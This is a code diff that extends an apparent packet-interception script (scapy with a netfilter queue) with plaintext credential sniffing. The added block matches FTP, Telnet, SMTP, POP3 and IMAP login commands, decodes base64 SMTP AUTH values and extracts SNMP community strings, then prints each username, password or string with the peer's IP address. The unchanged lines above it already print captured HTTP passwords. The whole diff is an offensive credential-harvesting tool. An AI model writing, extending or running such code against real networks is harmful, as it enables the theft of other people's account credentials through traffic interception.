@@ -129,6 +129,115 @@ def process_packet(packet):
                     print(f"PWD: {pwd}")
                     print(f"CONTENT: {unquote_plus(body)}")
 
+    # ----------- Additional Plaintext Protocol Sniffing -----------
+    # Get IP layer and TCP/UDP layer
+    ip_layer = scapy_packet.getlayer(scapy.IP)
+    if scapy_packet.haslayer(scapy.TCP) or scapy_packet.haslayer(scapy.UDP):
+        sport = scapy_packet.sport
+        dport = scapy_packet.dport
+        proto = None
+        # FTP (port 21)
+        if 21 in (sport, dport):
+            proto = "FTP"
+        # Telnet (port 23)
+        elif 23 in (sport, dport):
+            proto = "TELNET"
+        # SMTP (25, 587, 465)
+        elif any(port in (sport, dport) for port in [25, 587, 465]):
+            proto = "SMTP"
+        # POP3 (110)
+        elif 110 in (sport, dport):
+            proto = "POP3"
+        # IMAP (143)
+        elif 143 in (sport, dport):
+            proto = "IMAP"
+        # SMB (445)
+        elif 445 in (sport, dport):
+            proto = "SMB"
+        # SNMP (161, 162)
+        elif any(port in (sport, dport) for port in [161, 162]):
+            proto = "SNMP"
+
+        # Only process if protocol detected and Raw layer exists
+        if proto and scapy_packet.haslayer(scapy.Raw):
+            try:
+                rawdata = bytes(scapy_packet[scapy.Raw].load)
+                payload_str = rawdata.decode("utf-8", errors="ignore")
+            except Exception:
+                payload_str = ""
+
+            # Host/peer IP
+            host_ip = ip_layer.dst if sport in (21,23,25,587,465,110,143,445,161,162) else ip_layer.src
+
+            # FTP
+            if proto == "FTP":
+                # USER username
+                user_match = re.search(r"\bUSER ([^\r\n]+)", payload_str)
+                pass_match = re.search(r"\bPASS ([^\r\n]+)", payload_str)
+                if user_match:
+                    ftp_user = user_match.group(1)
+                    print(f"FTP: {host_ip} LOGIN: {ftp_user}")
+                if pass_match:
+                    ftp_pass = pass_match.group(1)
+                    print(f"FTP: {host_ip} PWD: {ftp_pass}")
+
+            # Telnet
+            elif proto == "TELNET":
+                # Try to catch login/password prompts (heuristic)
+                login_match = re.search(r"login[: ]*([^\r\n]*)", payload_str, re.IGNORECASE)
+                pass_match = re.search(r"password[: ]*([^\r\n]*)", payload_str, re.IGNORECASE)
+                if login_match and login_match.group(1).strip():
+                    print(f"TELNET: {host_ip} LOGIN: {login_match.group(1).strip()}")
+                if pass_match and pass_match.group(1).strip():
+                    print(f"TELNET: {host_ip} PWD: {pass_match.group(1).strip()}")
+
+            # SMTP
+            elif proto == "SMTP":
+                # AUTH LOGIN base64(user) base64(pass)
+                auth_match = re.search(r"AUTH LOGIN\s+([A-Za-z0-9+/=]+)", payload_str)
+                if auth_match:
+                    import base64
+                    try:
+                        user = base64.b64decode(auth_match.group(1)).decode()
+                        print(f"SMTP: {host_ip} LOGIN: {user}")
+                    except Exception:
+                        pass
+                # Look for plain text login/password
+                login_match = re.search(r"user=([^\s&]+)", payload_str, re.IGNORECASE)
+                pass_match = re.search(r"pass=([^\s&]+)", payload_str, re.IGNORECASE)
+                if login_match:
+                    print(f"SMTP: {host_ip} LOGIN: {login_match.group(1)}")
+                if pass_match:
+                    print(f"SMTP: {host_ip} PWD: {pass_match.group(1)}")
+
+            # POP3
+            elif proto == "POP3":
+                user_match = re.search(r"\bUSER ([^\r\n]+)", payload_str)
+                pass_match = re.search(r"\bPASS ([^\r\n]+)", payload_str)
+                if user_match:
+                    print(f"POP3: {host_ip} LOGIN: {user_match.group(1)}")
+                if pass_match:
+                    print(f"POP3: {host_ip} PWD: {pass_match.group(1)}")
+
+            # IMAP
+            elif proto == "IMAP":
+                login_match = re.search(r'LOGIN\s+"?([^" ]+)"?\s+"?([^" ]+)"?', payload_str, re.IGNORECASE)
+                if login_match:
+                    print(f"IMAP: {host_ip} LOGIN: {login_match.group(1)} PWD: {login_match.group(2)}")
+
+            # SMB - only plaintext, very limited (real SMB parsing needs a lib)
+            elif proto == "SMB":
+                # Try to catch NTLM/Negotiate (heuristic)
+                if "NTLMSSP" in payload_str:
+                    print(f"SMB: {host_ip} NTLMSSP authentication detected (credentials not extractable here)")
+                # Basic, not reliable for all cases
+
+            # SNMP (community string is like a password)
+            elif proto == "SNMP":
+                comm_match = re.search(r"\x04([^\x00-\x1F]{4,32})", rawdata.decode("latin1", errors="ignore"))
+                if comm_match:
+                    print(f"SNMP: {host_ip} COMMUNITY: {comm_match.group(1)}")
+
     packet.accept()
 
 def main():
